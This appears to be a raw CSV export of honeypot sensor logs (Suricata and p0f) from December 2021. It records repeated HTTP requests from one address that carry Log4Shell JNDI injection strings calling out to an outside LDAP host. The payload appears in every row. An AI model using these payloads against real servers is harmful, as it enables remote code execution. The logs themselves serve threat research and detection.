"@timestamp","@version","_id","_index","_score","_type","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","alert.action","alert.category","alert.gid","alert.rev","alert.severity","alert.signature","alert.signature_id",app,"app_proto","cookies.sess_uuid","dest_ip","dest_port","ecs.version","event_type","fatt_http.clientHeaderHash","fatt_http.clientHeaderOrder","fatt_http.requestFullURI","fatt_http.requestMethod","fatt_http.requestURI","fatt_http.requestVersion","fatt_http.userAgent","fileinfo.filename","fileinfo.gaps","fileinfo.magic","fileinfo.md5","fileinfo.sid","fileinfo.size","fileinfo.state","fileinfo.stored","fileinfo.tx_id","flow.bytes_toclient","flow.bytes_toserver","flow.pkts_toclient","flow.pkts_toserver","flow.start","flow_id","geoip.as_org","geoip.asn","geoip.city_name","geoip.continent_code","geoip.country_code2","geoip.country_code3","geoip.country_name","geoip.dma_code","geoip.ip","geoip.latitude","geoip.location","geoip.longitude","geoip.postal_code","geoip.region_code","geoip.region_name","geoip.timezone",handler,"headers.accept","headers.accept-encoding","headers.connection","headers.cookie","headers.from","headers.host","headers.referer","headers.user-agent","headers.x-forwarded-for","host.name","http.accept_encoding","http.accept_language","http.authorization","http.from","http.hostname","http.http_content_type","http.http_method","http.http_port","http.http_refer","http.http_response_body","http.http_response_body_printable","http.http_user_agent","http.length","http.protocol","http.status","http.url","http.via","http.xff","in_iface","input.type","ip_rep",lang,level,"log.file.path","log.offset",message,"messageBadrequestsyntax($jndi","metadata.flowints.http.anomaly.count","metadata.flowints.tls.anomaly.count",method,mod,msg,params,path,payload,"payload_printable",proto,protocol,query,"raw_sig","response_msg.response.message.detection.name","response_msg.response.message.detection.order","response_msg.response.message.detection.type","response_msg.response.message.detection.version","response_msg.response.message.sess_uuid","response_msg.version",sensorID,"src_ip","src_port",status,stream,subject,"t-pot_hostname","t-pot_ip_ext","t-pot_ip_int",tags,timestamp,"tls.ja3.hash","tls.ja3.string","tls.ja3s.hash","tls.ja3s.string","tls.session_resumed","tls.sni","tls.version","tx_id",type,uuid
"2021-12-15T16:12:36.971Z",1,"aMLdvn0BCXMCNTQL-bL9","logstash-suricata-2021.12.15",,"_doc","9f01c876-ebd5-49c8-ac0f-6a9b9c912cfe",b4503e7c168d,"76eee910-a015-4adc-8fe0-687ab8c194fa",b4503e7c168d,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1970142635687247,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,b4503e7c168d,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/2673463270/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",66301230,"{""timestamp"":""2021-12-15T16:12:36.971433+0000"",""flow_id"":1970142635687247,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":41004,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/2673463270/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",41004,,,,highvalley,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:12:36.971433+0000",,,,,,,,0,Suricata,
"2021-12-15T16:12:36.000Z",1,wsLevn0BCXMCNTQLArKM,"logstash-p0f-2021.12.15",,"_doc","9f01c876-ebd5-49c8-ac0f-6a9b9c912cfe",b4503e7c168d,"76eee910-a015-4adc-8fe0-687ab8c194fa",b4503e7c168d,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,b4503e7c168d,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",34534470,"{""timestamp"": ""2021/12/15 16:12:36"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 41004, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2673463270/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2673463270/4443/C}",,,,,,,,"195.110.6.48",41004,,,cli,highvalley,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:12:21.907Z",1,bpHdvn0B6VkG8jKzvwl6,"logstash-suricata-2021.12.15",,"_doc","bfef6616-2b38-4fa6-8e90-ec99ad931ae5",cf47c22e327e,"ddfbf2f0-c8c7-4b2c-8b34-0d09a985408a",cf47c22e327e,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,285508284797015,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,cf47c22e327e,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/2261905984/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",37706382,"{""timestamp"":""2021-12-15T16:12:21.907819+0000"",""flow_id"":285508284797015,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":51360,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/2261905984/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",51360,,,,rawcoast,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:12:21.907819+0000",,,,,,,,0,Suricata,
"2021-12-15T16:12:21.000Z",1,f5Hdvn0B6VkG8jKzvwmI,"logstash-p0f-2021.12.15",,"_doc","bfef6616-2b38-4fa6-8e90-ec99ad931ae5",cf47c22e327e,"ddfbf2f0-c8c7-4b2c-8b34-0d09a985408a",cf47c22e327e,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,cf47c22e327e,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",51701230,"{""timestamp"": ""2021/12/15 16:12:21"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 51360, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2261905984/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2261905984/4443/C}",,,,,,,,"195.110.6.48",51360,,,cli,rawcoast,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:12:20.217Z",1,38Ldvn0BCXMCNTQLua4o,"logstash-suricata-2021.12.15",,"_doc","13aa9408-322c-43ae-a814-ed98938bd3a7",30ccdadf8271,"50457cf1-59c1-4d07-9e33-609c2c14ae5f",30ccdadf8271,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1731789129519213,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,30ccdadf8271,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/2769703975/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",33736689,"{""timestamp"":""2021-12-15T16:12:20.217210+0000"",""flow_id"":1731789129519213,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":56416,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/2769703975/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",56416,,,,satisfiedweakness,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:12:20.217210+0000",,,,,,,,0,Suricata,
"2021-12-15T16:12:20.000Z",1,ZC7dvn0B5e7x5EYnuVou,"logstash-p0f-2021.12.15",,"_doc","13aa9408-322c-43ae-a814-ed98938bd3a7",30ccdadf8271,"50457cf1-59c1-4d07-9e33-609c2c14ae5f",30ccdadf8271,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,30ccdadf8271,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",52750315,"{""timestamp"": ""2021/12/15 16:12:20"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 56416, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2769703975/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2769703975/4443/C}",,,,,,,,"195.110.6.48",56416,,,cli,satisfiedweakness,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:12:18.898Z",1,18Ldvn0BCXMCNTQLuK48,"logstash-suricata-2021.12.15",,"_doc","6a7feb4e-8d38-404a-b593-c85d16dfcf9a",08795fcc3b5e,"3f34f6f9-e3f7-4aea-9bba-8eec20d6197a",08795fcc3b5e,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,754286785105057,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,08795fcc3b5e,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/3165023819/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",30441221,"{""timestamp"":""2021-12-15T16:12:18.898360+0000"",""flow_id"":754286785105057,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":49066,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/3165023819/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",49066,,,,pastikebana,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:12:18.898360+0000",,,,,,,,0,Suricata,
"2021-12-15T16:12:18.000Z",1,OJHdvn0B6VkG8jKzuAlW,"logstash-p0f-2021.12.15",,"_doc","6a7feb4e-8d38-404a-b593-c85d16dfcf9a",08795fcc3b5e,"3f34f6f9-e3f7-4aea-9bba-8eec20d6197a",08795fcc3b5e,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,08795fcc3b5e,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",40293112,"{""timestamp"": ""2021/12/15 16:12:18"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 49066, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/3165023819/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/3165023819/4443/C}",,,,,,,,"195.110.6.48",49066,,,cli,pastikebana,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:12:04.011Z",1,jcLdvn0BCXMCNTQLe6vQ,"logstash-suricata-2021.12.15",,"_doc","ce9644ba-4407-4790-a216-9ed605f3b1d6",6774e89ff91d,"ce444089-8950-47de-880d-7e01a7e0c213",6774e89ff91d,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1618324682391963,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,6774e89ff91d,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/2808300507/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",54198299,"{""timestamp"":""2021-12-15T16:12:04.011426+0000"",""flow_id"":1618324682391963,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":58694,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/2808300507/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",58694,,,,fortunateworkhorse,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:12:04.011426+0000",,,,,,,,0,Suricata,
"2021-12-15T16:12:03.809Z",1,3cLdvn0BCXMCNTQLhKvQ,"logstash-suricata-2021.12.15",,"_doc","1c82e366-a501-4faa-89c5-9a930a2da558",d5c06704a974,"35064c15-2483-41fb-a866-d82f542f7c36",d5c06704a974,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,441441366266326,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,d5c06704a974,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/2682193288/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",47771120,"{""timestamp"":""2021-12-15T16:12:03.809980+0000"",""flow_id"":441441366266326,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":60100,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/2682193288/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",60100,,,,doubletomato,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:12:03.809980+0000",,,,,,,,0,Suricata,
